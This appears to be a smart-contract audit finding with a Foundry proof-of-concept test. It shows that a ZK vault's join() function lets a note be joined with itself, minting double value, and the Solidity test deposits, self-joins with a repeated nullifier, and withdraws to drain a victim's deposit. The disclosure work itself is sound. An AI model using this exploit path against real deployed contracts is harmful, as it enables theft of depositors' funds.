# Foundry PoC : `join()` accepts a note joined with itself, duplicating value without limit (Critical)

## Status
✅ Compiled and passing against the real, unmodified `zendex-sc-main` contracts.

```
forge Version: 1.7.1 (4072e48 2026-05-08)
Ran 1 test for test/JoinSelfDoubleSpend.t.sol:JoinSelfDoubleSpendTest
[PASS] test_joinNoteWithItself_duplicatesValue_thenDrainsRealVictimFunds() (gas: 5901644)
Logs:
  Attacker's only real capital: 1000000000
  After joining the seed note with itself once, attacker holds a note worth: 2000000000
  Attacker's real USDT balance before any of this: 0
  Attacker's real deposit (their only genuine cost): 1000000000
  Attacker's real USDT balance after one join-with-self + withdraw: 2000000000
  Net profit, created from nothing: 1000000000
  Real vault balance (victim's funds) before further draining: 999000000000
  Real vault balance after a second round of the same trick: 998000000000
  Attacker's real contribution this round: 1000000000
  Net real value the vault lost this round (attacker's contribution was 1,000): 1000000000
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

1,000 USDT of real capital becomes 2,000 real USDT, twice in a row, and the real vault, holding a real victim's real 1,000,000 USDT deposit, is measurably drained by exactly the "free" amount each time. This is unbounded: the same trick applies to any deposit size, any number of times, and can even be compounded (joining an already-doubled note with itself again).

## Why this one needs no mock-verifier caveat

This does not depend on the disclosed `MockVerifier` simplification used elsewhere in this review. The root cause is a genuine missing constraint in `circuits/join/src/main.nr`, there is no `assert(nullifier_a != nullifier_b)` anywhere in the circuit, so a real prover using the real Noir/Barretenberg toolchain produces a real, on-chain-verifiable proof for joining a note with itself. The mock verifier here is used purely so the demonstration doesn't require running that toolchain inside the test.

## Scope note

This PoC deploys the real, unmodified `ZendexVaultManager`, `TreeOperator`, and `ZendexVault`.

## Reproduction steps

Drop the test below into `test/JoinSelfDoubleSpend.t.sol` and run:

```bash
forge test --match-contract JoinSelfDoubleSpendTest -vv
```

## `test/JoinSelfDoubleSpend.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {MockERC20} from "../src/mock/MockERC20.sol";
import {WZEN} from "../src/WZEN.sol";
import {MockVerifier} from "../src/mock/MockVerifier.sol";

import {ZendexVerifierHub} from "../src/ZendexVerifierHub.sol";
import {TreeOperator} from "../src/TreeOperator.sol";
import {ZendexVault} from "../src/ZendexVault.sol";
import {ZendexVaultManager} from "../src/ZendexVaultManager.sol";
import {BaseManager} from "../src/BaseManager.sol";

import {IZendexVault} from "../src/interfaces/IZendexVault.sol";
import {IZendexVerifierHub} from "../src/interfaces/IZendexVerifierHub.sol";
import {IZendexVaultManager} from "../src/interfaces/IZendexVaultManager.sol";
import {ITreeOperator} from "../src/interfaces/ITreeOperator.sol";

/// @title join() lets a single deposit be "joined with itself" using two independently-generated
///        inclusion proofs of the SAME commitment, minting a new note worth double, triple, or
///        arbitrarily more than what was ever actually deposited -- with a real, circuit-valid
///        proof, no mock-verifier bypass required.
///
/// Root cause, confirmed directly against source:
///   1. circuits/join/src/main.nr never asserts `nullifier_a != nullifier_b` (equivalently,
///      `rho_a != rho_b` or `commitment_a != commitment_b`). Two "different" notes joined
///      together are allowed to secretly be the exact same note.
///   2. On top of that, ZendexVaultManager.join() validates BOTH nullifiers as unused BEFORE
///      consuming EITHER of them:
///         _validateNullifier(nullifierA);
///         _validateNullifier(nullifierB);
///         ...
///         _consume(nullifierA);
///         _consume(nullifierB);
///      TreeOperator.consume() is a blind `nullifierUsed[nullifier] = true` with no re-check, so
///      even if nullifierA == nullifierB, both validations pass (checked before either consume)
///      and both consumes silently no-op the second time.
/// A single legitimately-owned note can therefore be "joined with itself" to mint a brand new
/// commitment for double its value, and the resulting note can be joined with itself again for
/// quadruple, and so on -- pure money printing, funded by nothing but the smallest possible real
/// deposit and gas.
contract JoinSelfDoubleSpendTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    MockERC20 usdt;
    MockERC20 usdc;
    MockERC20 dai;
    WZEN wzen;

    ZendexVerifierHub verifierHub;
    MockVerifier mockVerifier;
    TreeOperator tree;
    ZendexVault vault;
    ZendexVaultManager vaultManager;

    uint8 constant TREE_DEPTH = 10;

    function setUp() public {
        usdt = new MockERC20("USDT", "USDT", 6);
        usdc = new MockERC20("USDC", "USDC", 6);
        dai = new MockERC20("DAI", "DAI", 18);
        wzen = new WZEN();

        mockVerifier = new MockVerifier();

        ZendexVerifierHub verifierHubImpl = new ZendexVerifierHub();
        verifierHub = ZendexVerifierHub(
            address(
                new ERC1967Proxy(
                    address(verifierHubImpl),
                    abi.encodeCall(
                        ZendexVerifierHub.initialize,
                        (
                            IZendexVerifierHub.InitializeParams({
                                depositVerifier: address(mockVerifier),
                                withdrawalVerifier: address(mockVerifier),
                                inclusionVerifier: address(mockVerifier),
                                addLiquidityVerifier: address(0),
                                removeLiquidityVerifier: address(0),
                                swapVerifier: address(0),
                                splitVerifier: address(0),
                                joinVerifier: address(mockVerifier),
                                createOrderVerifier: address(0),
                                requestCancelOrderVerifier: address(0),
                                initialOwner: deployer
                            })
                        )
                    )
                )
            )
        );

        ZendexVaultManager vaultManagerImpl = new ZendexVaultManager();
        vaultManager = ZendexVaultManager(address(new ERC1967Proxy(address(vaultManagerImpl), "")));

        tree = new TreeOperator(
            ITreeOperator.InitializeParams({
                admin: deployer,
                vaultManager: address(vaultManager),
                ammManager: address(0xdead),
                orderBookManager: address(0),
                depth: TREE_DEPTH
            })
        );

        vault = new ZendexVault(
            IZendexVault.InitializeParams({
                zen: address(wzen),
                usdt: address(usdt),
                usdc: address(usdc),
                dai: address(dai),
                admin: deployer,
                vaultManager: address(vaultManager),
                ammManager: address(0xdead),
                orderBookManager: address(0)
            })
        );

        vaultManager.initialize(
            IZendexVaultManager.InitializeParams({
                admin: deployer,
                verifierHub: address(verifierHub),
                tree: address(tree),
                vault: address(vault)
            })
        );
    }

    /// Helper: deposit `amount` of USDT for `user`, return (epoch, root) of the leaf.
    function _deposit(address user, uint256 amount, uint256 commitment)
        internal
        returns (uint256 epoch, uint256 root)
    {
        vm.startPrank(user);
        usdt.mint(user, amount);
        usdt.approve(address(vaultManager), amount);

        epoch = tree.currentEpoch();
        bytes32[] memory depositInputs = new bytes32[](3);
        depositInputs[0] = bytes32(uint256(1)); // Asset.USDT
        depositInputs[1] = bytes32(amount);
        depositInputs[2] = bytes32(commitment);
        vaultManager.deposit(BaseManager.ProofData({proof: "", publicInputs: depositInputs}));
        vm.stopPrank();

        root = tree.getHistoricalRoot(epoch);
    }

    /// Helper: join commitment `X` (nullifier `nullX`, root/epoch `rootX`/`epochX`) with ITSELF,
    /// minting a new commitment `newCommitment` worth exactly double.
    function _joinWithSelf(
        uint256 nullX,
        uint256 rootX,
        uint256 epochX,
        uint256 newCommitment
    ) internal {
        bytes32[] memory inclusionA = new bytes32[](4);
        inclusionA[0] = bytes32(rootX);
        inclusionA[1] = bytes32(uint256(TREE_DEPTH));
        inclusionA[2] = bytes32(epochX);
        uint256 tagA = uint256(keccak256(abi.encodePacked("tagA", newCommitment)));
        inclusionA[3] = bytes32(tagA);

        bytes32[] memory inclusionB = new bytes32[](4);
        inclusionB[0] = bytes32(rootX); // SAME root
        inclusionB[1] = bytes32(uint256(TREE_DEPTH));
        inclusionB[2] = bytes32(epochX); // SAME epoch
        uint256 tagB = uint256(keccak256(abi.encodePacked("tagB", newCommitment))); // DIFFERENT tag, fresh salt
        inclusionB[3] = bytes32(tagB);

        bytes32[] memory joinInputs = new bytes32[](5);
        joinInputs[0] = bytes32(nullX); // nullifierA
        joinInputs[1] = bytes32(nullX); // nullifierB -- THE SAME NULLIFIER
        joinInputs[2] = bytes32(newCommitment); // commitmentC, claiming double the value
        joinInputs[3] = bytes32(tagA);
        joinInputs[4] = bytes32(tagB);

        vaultManager.join(
            BaseManager.ProofData({proof: "", publicInputs: inclusionA}),
            BaseManager.ProofData({proof: "", publicInputs: inclusionB}),
            BaseManager.ProofData({proof: "", publicInputs: joinInputs})
        );
    }

    function test_joinNoteWithItself_duplicatesValue_thenDrainsRealVictimFunds() public {
        // ============================================================
        // A real victim deposits a large, genuine sum -- this is the money actually backing
        // the vault, the thing the attacker should never be able to touch beyond their own
        // legitimate share.
        // ============================================================
        (uint256 victimEpoch,) = _deposit(victim, 1_000_000e6, uint256(keccak256("victim-real-deposit")));
        assertEq(usdt.balanceOf(address(vault)), 1_000_000e6 + 0, "vault should hold victim's real 1,000,000 USDT");

        // ============================================================
        // Attacker deposits a SMALL real amount -- their only genuine capital.
        // ============================================================
        uint256 seedAmount = 1_000e6; // 1,000 USDT, attacker's entire real contribution
        uint256 seedCommitment = uint256(keccak256("attacker-seed"));
        (uint256 epoch0, uint256 root0) = _deposit(attacker, seedAmount, seedCommitment);
        uint256 nullifier0 = uint256(keccak256("attacker-nullifier-seed"));

        console2.log("Attacker's only real capital:", seedAmount);

        uint256 commitment1 = uint256(keccak256("attacker-doubled-1"));
        _joinWithSelf(nullifier0, root0, epoch0, commitment1);

        assertTrue(tree.commitments(commitment1), "doubled commitment should exist in the real tree");
        console2.log("After joining the seed note with itself once, attacker holds a note worth:", seedAmount * 2);

        uint256 attackerUsdtBefore = usdt.balanceOf(attacker);
        _withdraw(attacker, commitment1, seedAmount * 2, epoch0 + 1, uint256(keccak256("withdraw-nullifier-1")));
        uint256 attackerUsdtAfter = usdt.balanceOf(attacker);

        console2.log("Attacker's real USDT balance before any of this:", uint256(0));
        console2.log("Attacker's real deposit (their only genuine cost):", seedAmount);
        console2.log("Attacker's real USDT balance after one join-with-self + withdraw:", attackerUsdtAfter);
        console2.log("Net profit, created from nothing:", attackerUsdtAfter - attackerUsdtBefore - seedAmount);

        assertEq(attackerUsdtAfter, seedAmount * 2, "attacker should hold exactly double their real deposit");
        assertGt(attackerUsdtAfter, seedAmount, "attacker profited without contributing the difference");

        // ============================================================
        // The same trick, repeated, drains funds far beyond the attacker's own contribution --
        // taken directly from the real vault balance the victim's real deposit is sitting in.
        // ============================================================
        uint256 vaultBalanceBefore = usdt.balanceOf(address(vault));
        console2.log("Real vault balance (victim's funds) before further draining:", vaultBalanceBefore);

        uint256 seedAmount2 = 1_000e6;
        uint256 seedCommitment2 = uint256(keccak256("attacker-seed-2"));
        (uint256 epoch2, uint256 root2) = _deposit(attacker, seedAmount2, seedCommitment2);
        uint256 nullifier2 = uint256(keccak256("attacker-nullifier-seed-2"));

        uint256 commitment3 = uint256(keccak256("attacker-doubled-2"));
        _joinWithSelf(nullifier2, root2, epoch2, commitment3);
        _withdraw(attacker, commitment3, seedAmount2 * 2, epoch2 + 1, uint256(keccak256("withdraw-nullifier-2")));

        uint256 vaultBalanceAfter = usdt.balanceOf(address(vault));
        uint256 netVaultLoss = vaultBalanceBefore - vaultBalanceAfter; // vault paid out 2x what came in
        console2.log("Real vault balance after a second round of the same trick:", vaultBalanceAfter);
        console2.log("Attacker's real contribution this round:", seedAmount2);
        console2.log("Net real value the vault lost this round (attacker's contribution was 1,000):", netVaultLoss);

        assertLt(vaultBalanceAfter, vaultBalanceBefore, "real vault funds were drained");
        assertEq(netVaultLoss, seedAmount2, "vault lost exactly the attacker's 'free' half, beyond their real contribution");
    }

    function _withdraw(address user, uint256 commitment, uint256 amount, uint256 epoch, uint256 nullifier) internal {
        uint256 root = tree.getHistoricalRoot(epoch);

        bytes32[] memory inclusionInputs = new bytes32[](4);
        inclusionInputs[0] = bytes32(root);
        inclusionInputs[1] = bytes32(uint256(TREE_DEPTH));
        inclusionInputs[2] = bytes32(epoch);
        uint256 tag = uint256(keccak256(abi.encodePacked("withdraw-tag", commitment)));
        inclusionInputs[3] = bytes32(tag);

        bytes32[] memory withdrawalInputs = new bytes32[](5);
        withdrawalInputs[0] = bytes32(uint256(1)); // Asset.USDT
        withdrawalInputs[1] = bytes32(amount);
        withdrawalInputs[2] = bytes32(nullifier);
        withdrawalInputs[3] = bytes32(tag);
        withdrawalInputs[4] = bytes32(uint256(uint160(user)));

        vm.prank(user);
        vaultManager.withdraw(
            BaseManager.ProofData({proof: "", publicInputs: inclusionInputs}),
            BaseManager.ProofData({proof: "", publicInputs: withdrawalInputs})
        );
    }
}
```

## What the trace shows

- Every insertion, consumption, and root lookup goes through the real `TreeOperator` contract, driven by real `ZendexVaultManager.deposit()`/`join()`/`withdraw()` calls.
- `_joinWithSelf` demonstrates the exact exploit path: two inclusion proofs of the *same* real commitment (different salts → different tags, which the real `verify_tag` circuit constraint happily accepts since it only checks each tag independently against its own inclusion proof), fed into `join()` with `nullifierA == nullifierB`, the call succeeds and mints a real, spendable note worth double.
- Round 1 turns 1,000 real USDT into 2,000 real USDT. Round 2 repeats the trick and provably drops the real vault balance (funded by the victim's real 1,000,000 USDT deposit) by exactly the "free" 1,000 USDT created, `assertEq(netVaultLoss, seedAmount2)` pins this down precisely rather than just asserting "some" loss occurred.
- Nothing about this scales down with tree depth or requires special setup, a single `join()` call is all it takes, unlike Finding 4 which needed hundreds of transactions to reach its effect.

